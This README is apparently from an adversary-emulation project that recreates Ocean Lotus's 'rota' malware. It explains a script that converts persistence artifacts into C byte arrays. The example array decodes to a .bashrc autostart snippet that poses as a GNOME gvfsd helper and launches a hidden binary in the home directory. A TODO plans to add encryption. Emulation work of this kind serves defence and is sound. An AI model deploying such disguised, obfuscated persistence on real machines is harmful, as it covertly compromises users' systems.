## Utils
These files represent the persistence artifacts left by Ocean Lotus.
The [file2bytearray.py](./file2bytearray.py) script converts an arbitrary file to a C byte array to be used for stack-strings within the rota tool.
Examples of this can be seen within [persistence.c](../src/persistence.c)

### Usage Example
* Specify a file to read in and convert to a byte array to be used within rota.
``` sh
$> python3 file2bytearray.py -f bashrc-autostart
```

Example output:

``` c
char bashrc_autostart [219] = {0x23,0x20,0x41,0x64,0x64,0x20,0x47,0x4e,0x4f,0x4d,0x45,0x27,0x73,0x20,0x68,0x65,0x6c,0x70,0x65,0x72,0x20,0x64,0x65,0x73,0x69,0x67,0x6e,0x65,0x64,0x20,0x74,0x6f,0x20,0x77,0x6f,0x72,0x6b,0x20,0x77,0x69,0x74,0x68,0x20,0x74,0x68,0x65,0x20,0x49,0x2f,0x4f,0x20,0x61,0x62,0x73,0x74,0x72,0x61,0x63,0x74,0x69,0x6f,0x6e,0x20,0x6f,0x66,0x20,0x47,0x49,0x4f,0xa,0x23,0x20,0x74,0x68,0x69,0x73,0x20,0x65,0x6e,0x76,0x69,0x72,0x6f,0x6e,0x6d,0x65,0x6e,0x74,0x20,0x76,0x61,0x72,0x69,0x61,0x62,0x6c,0x65,0x20,0x69,0x73,0x20,0x73,0x65,0x74,0x2c,0x20,0x67,0x76,0x66,0x73,0x64,0x20,0x77,0x69,0x6c,0x6c,0x20,0x6e,0x6f,0x74,0x20,0x73,0x74,0x61,0x72,0x74,0x20,0x74,0x68,0x65,0x20,0x66,0x75,0x73,0x65,0x20,0x66,0x69,0x6c,0x65,0x73,0x79,0x73,0x74,0x65,0x6d,0xa,0x69,0x66,0x20,0x5b,0x20,0x2d,0x64,0x20,0x24,0x7b,0x48,0x4f,0x4d,0x45,0x7d,0x20,0x5d,0x3b,0x20,0x74,0x68,0x65,0x6e,0xa,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x24,0x7b,0x48,0x4f,0x4d,0x45,0x7d,0x2f,0x2e,0x67,0x76,0x66,0x73,0x64,0x2f,0x2e,0x70,0x72,0x6f,0x66,0x69,0x6c,0x65,0x2f,0x67,0x76,0x66,0x73,0x64,0x2d,0x68,0x65,0x6c,0x70,0x65,0x72,0xa,0x66,0x69,0xa};

### TODO
Enhance `file2bytearray.py` to also perform encryption + rotate.
